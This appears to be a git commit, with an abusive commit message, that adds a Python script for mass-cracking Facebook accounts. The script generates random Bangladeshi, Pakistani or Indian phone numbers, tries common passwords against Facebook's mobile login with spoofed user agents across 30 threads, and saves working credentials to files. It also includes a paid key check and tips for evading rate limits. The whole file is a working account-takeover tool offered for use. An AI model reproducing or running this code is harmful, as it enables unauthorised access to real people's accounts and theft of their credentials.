0e1d8013d874347caea6518685c0d2364d68ec82
Md Mehedi <132669573+Mr-Devil-404@users.noreply.github.com>
2025-09-03 08:43:03 +0300

    Add files via upload
    তোর প্রতি টা script ডিকোড করবো মাদারচোদ✅☠️

---
+++ Fuck-Sifat.py
@@ -0,0 +1,256 @@
+# -*- coding: utf-8 -*-
+import os
+import sys
+import time
+import requests
+import uuid
+import random
+import string
+from concurrent.futures import ThreadPoolExecutor
+from requests.exceptions import ConnectionError
+os.system('pkg install espeak')
+os.system('git pull')
+from bs4 import BeautifulSoup
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as ss
+session = requests.Session()
+now = datetime.now()
+dt_string = now.strftime('%H:%M:%S')
+month = datetime.now().month
+day = datetime.now().day
+year = datetime.now().year
+ugen2 = []
+ugen = []
+for xd in range(10000):
+    aa = 'Mozilla/5.0 (Linux; U; Android'
+    b = random.choice(['3.0', '4.0', '5.0', '6.0', '7.0', '8.1.0', '9', '10', '11', '12', '13'])
+    c = random.choice([' en-us; GT-'])
+    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e = random.randrange(1, 999)
+    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h = random.randrange(73, 100)
+    i = '0'
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    l = 'Mobile Safari/537.36'
+    uaku2 = f'''{aa} {b}{c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
+    ugen.append(uaku2)
+A = '\x1b[1;97m'
+B = '\x1b[1;96m'
+C = '\x1b[1;91m'
+D = '\x1b[1;92m'
+M = '\x1b[1;31m'
+H = '\x1b[1;32m'
+N = '\x1b[1;33m'
+S = '\x1b[1;35m'
+K = '\x1b[1;34m'
+W = '\x1b[1;37m'
+P = '\x1b[1;36m'
+loop = 0
+oks = []
+cps = []
+proxy = []
+method = []
+sit = []
+current_date = date.today().strftime('%d-%B-%Y')
+
+def approval():
+    os.system('clear')
+    logo()
+    uuid = str(os.geteuid()) + str(os.getlogin())
+    id = '-'.join(uuid)
+    try:
+        r = requests.get('https://github.com/sifat403/Apprvalsifat403/blob/main/ApprvaluD').text
+        if id in r:
+            print(f'''\x1b[38;5;160m[\x1b[1;97m\xe1\xaf\xa4\x1b[38;5;160m] \x1b[1;97mYOUR KEY \x1b[1;97m\xc2\xbb \x1b[0;32mAPPROVED''')
+            time.sleep(3)
+            rmenu1()
+        else:
+            print(f'''\x1b[38;5;160m[\x1b[1;97m\xe1\xaf\xa4\x1b[38;5;160m] \x1b[1;97mYOUR KEY \x1b[1;97m\xc2\xbb {id}''')
+            print(f'''\x1b[38;5;160m[\x1b[1;97m\xe1\xaf\xa4\x1b[38;5;160m] \x1b[1;97mIF U WANT TO BUY THEN PRESS ENTER ''')
+            os.system('xdg-open https://wa.me/+8801848580864')
+            ss = input(f''' PRESS ENTER TO SENT KEY INBOX''')
+            approval()
+    except:
+        sys.exit()
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+def logo():
+    print(f'''\n\u001b[38;5;46m\n     \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n\u001b[38;5;47m      \u2588\u2588 \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588    \u2588\u2588    \n\u001b[38;5;48m\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2588\u2588    \n\u001b[38;5;49m     \u2588\u2588 \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588    \u2588\u2588    \n\u001b[38;5;50m\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588    \u2588\u2588\n\x1b[1;92m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\x1b[1;92m \n\x1b[1;32m  OWNER      : MD. SIFAT HOSSAIN\n\x1b[1;32m GITHUB     : SIFAT-VAI143\n\x1b[1;32m FACEBOOK   : Md. Sifat Hossain \n\x1b[1;32m TOOL       : RANDOM\n\x1b[1;32m TYPE       : PAID\n\x1b[1;32m VERSION    : 1.0\n\x1b[1;32m WHATSAPP   : 01848580864                      \n\x1b[1;92m\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\x1b[1;92m''')
+    os.system('espeak -a 300 " Assalamuolaikum"')
+    os.system('espeak -a 300 "well,come to,sifat, tools"')
+
+def rmenu1():
+    os.system('clear')
+    logo()
+    print(' \x1b[1;92m[1] \x1b[1;92mRANDOM CRACK [\x1b[1;96mBANGLADESH\x1b[1;92m]')
+    print(' \x1b[1;92m[2] \x1b[1;92mRANDOM CRACK [\x1b[1;96mPAKISTAN\x1b[1;92m]')
+    print(' \x1b[1;92m[3] \x1b[1;92mRANDOM CRACK [\x1b[1;96mINDIA\x1b[1;92m]')
+    print(' \x1b[1;91m[0] \x1b[1;91mEXIT')
+    print('')
+    ghx = input('\x1b[1;92m\x1b[1;92m] Choice : ')
+    if ghx in ('1',):
+        BDX()
+    elif ghx in ('2',):
+        PAKX()
+    elif ghx in ('3',):
+        INDX()
+    elif ghx in ('0',):
+        sys.exit()
+    else:
+        print('\n\x1b[1;91m \t Choose valid option')
+        time.sleep(1)
+        rmenu1()
+
+def BDX():
+    user = []
+    os.system('clear')
+    logo()
+    print('\x1b[1;32mBD SIM CODE : \x1b[1;32m017 \x1b[1;32m015 \x1b[1;32m018 \x1b[1;32m019 \x1b[1;32m013 \x1b[1;32m016')
+    print(47 * '-')
+    kode = input('SIM CODE : ')
+    print(47 * '-')
+    limit = int(input(' Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPoolExecutor(max_workers=30) as sifat:
+        os.system('clear')
+        logo()
+        tl = str(len(user))
+        print('\x1b[1;32mTOTAL ID : \x1b[1;92m' + tl)
+        print(f'''\x1b[1;32m]\x1b[1;97mSIM CODE : \x1b[1;92m{kode}''')
+        print('\x1b[1;32m]\x1b[1;37mTHE PROCESS HAS BEEN STARTED')
+        print(47 * '-')
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, guru[2:], uid, 'khan123', '57273200']
+            sifat.submit(graph, uid, pwx, tl)
+    print('DONE')
+
+def PAKX():
+    user = []
+    os.system('clear')
+    logo()
+    print('PAK SIM CODE : ')
+    print(47 * '-')
+    kode = input('SIM CODE : ')
+    print(47 * '-')
+    limit = int(input(' Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPoolExecutor(max_workers=30) as sifat:
+        os.system('clear')
+        logo()
+        tl = str(len(user))
+        print('TOTAL ID : \x1b[1;92m' + tl)
+        print(f'''\x1b[1;32m]\x1b[1;97mSIM CODE : \x1b[1;92m{kode}''')
+        print('\x1b[1;32m]\x1b[1;37mTHE PROCESS HAS BEEN STARTED')
+        print('\x1b[1;32m]\x1b[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ')
+        print(47 * '-')
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, 'khan123', '57273200']
+            sifat.submit(graph, uid, pwx, tl)
+    print('DONE')
+
+def INDX():
+    user = []
+    os.system('clear')
+    logo()
+    print('INDIA SIM CODE : ')
+    print(47 * '-')
+    kode = input('SIM CODE : ')
+    print(47 * '-')
+    limit = int(input(' Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPoolExecutor(max_workers=30) as sifat:
+        os.system('clear')
+        logo()
+        tl = str(len(user))
+        print('TOTAL ID : \x1b[1;92m' + tl)
+        print(f'''\x1b[1;32m]\x1b[1;97mSIM CODE : \x1b[1;92m{kode}''')
+        print('\x1b[1;32m]\x1b[1;37mTHE PROCESS HAS BEEN STARTED')
+        print('\x1b[1;32m]\x1b[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ')
+        print(47 * '-')
+        for guru in user:
+            uid = kode + guru
+            pwx = [guru, guru[2:], uid, 'khan123', '57273200']
+            sifat.submit(graph, uid, pwx, tl)
+    print('DONE')
+
+def graph(uid, pwx, tl):
+    global loop
+    global oks
+    global cps
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": ps,
+                "login": "Log In"}
+            header_freefb = {
+                'authority': 'm.facebook.com',
+                'method': 'POST',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+                'referer': 'https://m.facebook.com/',
+                'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Google Chrome";v="111"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': pro
+            }
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc', data=log_data, headers=header_freefb).text
+            log_cookies = session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki = ';'.join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
+                cid = coki.split('c_user=')[1].split(';')[0]
+                print(f'\r\r\x1b[1;32m[SIFAT-OK] {cid} | {ps}')
+                os.system('espeak -a 300 "ok id"')
+                open('/sdcard/SIFAT-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki = ';'.join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
+                cid = coki.split('checkpoint=')[1].split(';')[0]
+                print(f'\r\r\x1b[1;31m[SIFAT-CP] {cid} | {ps}')
+                os.system('espeak -a 300 "cp id"')
+                open('/sdcard/SIFAT-CP.txt', 'a').write(cid + ' | ' + ps + '\n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\r%s SIFAT-M2%s%s [%s/%s] OK:%s  CP:%s%s' % ('\x1b[1;32m', '\x1b[1;32m', ']', str(loop), tl, str(len(oks)), str(len(cps)), '] \x1b[1;32m'))
+        sys.stdout.flush()
+    except:
+        pass
+
+if __name__ == '__main__':
+    approval()
